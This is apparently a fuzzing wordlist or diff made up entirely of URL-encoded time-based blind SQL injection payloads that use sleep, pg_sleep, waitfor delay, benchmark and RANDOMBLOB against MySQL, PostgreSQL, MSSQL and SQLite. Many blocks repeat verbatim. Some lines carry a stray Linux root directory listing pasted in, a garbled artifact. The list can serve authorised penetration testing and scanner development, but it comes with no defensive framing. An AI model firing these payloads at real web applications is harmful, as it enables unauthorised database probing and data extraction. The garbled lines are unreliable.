+1+waitfor+delay+%270%3a0%3a10%27--%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a__TIME__%27--%0a
+a%27+waitfor+delay+%270%3a0%3a10%27--%0a
+1+or+sleep%28__TIME__%29%23%0a
+"+or+pg_sleep%28__TIME__%29--%0a
+%2520%27sleep%252050%27%0a
+1%29%29+or+pg_sleep%28__TIME__%29--%0a
+or+sleep%28__TIME__%29%3d%27%0a
+or+pg_sleep%28__TIME__%29--%0a
+"%29+or+sleep%28__TIME__%29%3d"%0a
+%29+or+pg_sleep%28__TIME__%29--%0a
+or+sleep%28__TIME__%29%23%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%2a0%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%286%2a6-30%29%2c0%29%29OR%27%0a
+%2bor%2bsleep%280.000000001%29%0a
+%2520AND%2520SLEEP%285%29%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29%0a
+-sleep%285%29%0a
+%27%252bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%252b%27%0a
+%27%252b%28select%2afrom%28select%28sleep%282%29%29%29a%29%252b%27%0a
+pg_sleep%2830%29--%0a
+%28select%280%29from%28select%28sleep%2825%29%29%29v%29%0a
+-sleep%2f%2af%2a%2f%2810%29%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d5%2csleep%2f%2af%2a%2f%285%29%2c0%29%0a
+%27%3bSELECT+1%3bSELECT+pg_sleep%2830%29%3b--%27%0a
+%2520AND%2520SLEEP%287%29%2523%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29a%29%0a
+%27xor%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29or%27%0a
+%27xor%28if%28mid%28database%28%29%2c1%2c1%29%3d0x41%2csleep%2863%29%2c0%29%29or%27%0a
+%2bor%2bsleep%280.000000001%29%0a
+%2520AND%2520SLEEP%2815%29%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%0a
+sleep%285%29%23%0a
+1+or+sleep%285%29%23%0a
+"+or+sleep%285%29%23%0a
+%27+or+sleep%285%29%23%0a
+"+or+sleep%285%29%3d"%0a
+%27+or+sleep%285%29%3d%27%0a
+1%29+or+sleep%285%29%23%0a
+"%29+or+sleep%285%29%3d"%0a
+%27%29+or+sleep%285%29%3d%27%0a
+1%29%29+or+sleep%285%29%23%0a
+"%29%29+or+sleep%285%29%3d"%0a
+%27%29%29+or+sleep%285%29%3d%27%0a
+%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1+or+pg_sleep%285%29--%0a
+"+or+pg_sleep%285%29--%0a
+%27+or+pg_sleep%285%29--%0a
+1%29+or+pg_sleep%285%29--%0a
+"%29+or+pg_sleep%285%29--%0a
+%27%29+or+pg_sleep%285%29--%0a
+1%29%29+or+pg_sleep%285%29--%0a
+"%29%29+or+pg_sleep%285%29--%0a
+%27%29%29+or+pg_sleep%285%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3d%27vRxe%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29YjoC%29+AND+%27%25%27%3d%27%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or+SLEEP%285%29%0a
+or+SLEEP%285%29%23%0a
+or+SLEEP%285%29--%0a
+or+SLEEP%285%29%3d"%0a
+or+SLEEP%285%29%3d%27%0a
+waitfor+delay+%2700%3a00%3a05%27%0a
+waitfor+delay+%2700%3a00%3a05%27--%0a
+waitfor+delay+%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or+benchmark%2850000000%2cMD5%281%29%29%0a
+or+benchmark%2850000000%2cMD5%281%29%29--%0a
+or+benchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or+pg_SLEEP%285%29%0a
+or+pg_SLEEP%285%29--%0a
+or+pg_SLEEP%285%29%23%0a
+%27"%0a
+AnD+SLEEP%285%29%0a
+AnD+SLEEP%285%29--%0a
+AnD+SLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27+AnD+SLEEP%285%29+ANd+%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER+BY+SLEEP%285%29%0a
+ORDER+BY+SLEEP%285%29--%0a
+ORDER+BY+SLEEP%285%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b+SLEEP%2810%29+%2b+%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27+or+SLEEP%281%29+or+%27"+or+SLEEP%281%29+or+"%2a%2f%0a
+sleep%285%29%23%0a
+1+or+sleep%285%29%23%0a
+"+or+sleep%285%29%23%0a
+%27+or+sleep%285%29%23%0a
+"+or+sleep%285%29%3d"%0a
+%27+or+sleep%285%29%3d%27%0a
+1%29+or+sleep%285%29%23%0a
+"%29+or+sleep%285%29%3d"%0a
+%27%29+or+sleep%285%29%3d%27%0a
+1%29%29+or+sleep%285%29%23%0a
+"%29%29+or+sleep%285%29%3d"%0a
+%27%29%29+or+sleep%285%29%3d%27%0a
+%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1+or+pg_sleep%285%29--%0a
+"+or+pg_sleep%285%29--%0a
+%27+or+pg_sleep%285%29--%0a
+1%29+or+pg_sleep%285%29--%0a
+"%29+or+pg_sleep%285%29--%0a
+%27%29+or+pg_sleep%285%29--%0a
+1%29%29+or+pg_sleep%285%29--%0a
+"%29%29+or+pg_sleep%285%29--%0a
+%27%29%29+or+pg_sleep%285%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3d%27vRxe%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29YjoC%29+AND+%27%25%27%3d%27%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or+SLEEP%285%29%0a
+or+SLEEP%285%29%23%0a
+or+SLEEP%285%29--%0a
+or+SLEEP%285%29%3d"%0a
+or+SLEEP%285%29%3d%27%0a
+waitfor+delay+%2700%3a00%3a05%27%0a
+waitfor+delay+%2700%3a00%3a05%27--%0a
+waitfor+delay+%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or+benchmark%2850000000%2cMD5%281%29%29%0a
+or+benchmark%2850000000%2cMD5%281%29%29--%0a
+or+benchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or+pg_SLEEP%285%29%0a
+or+pg_SLEEP%285%29--%0a
+or+pg_SLEEP%285%29%23%0a
+%27"%0a
+AnD+SLEEP%285%29%0a
+AnD+SLEEP%285%29--%0a
+AnD+SLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27+AnD+SLEEP%285%29+ANd+%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER+BY+SLEEP%285%29%0a
+ORDER+BY+SLEEP%285%29--%0a
+ORDER+BY+SLEEP%285%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b+SLEEP%2810%29+%2b+%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27+or+SLEEP%281%29+or+%27"+or+SLEEP%281%29+or+"%2a%2f%0a
+%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%29%2520waifor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%29%2520waifor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+%27%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520%2f%2a%0a
+"%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520waitfor%2520delay%2520%270%3a0%3a20%27%2520--%0a
+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27+waitfor+delay+%270%3a0%3a20%27+--%0a
+"+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
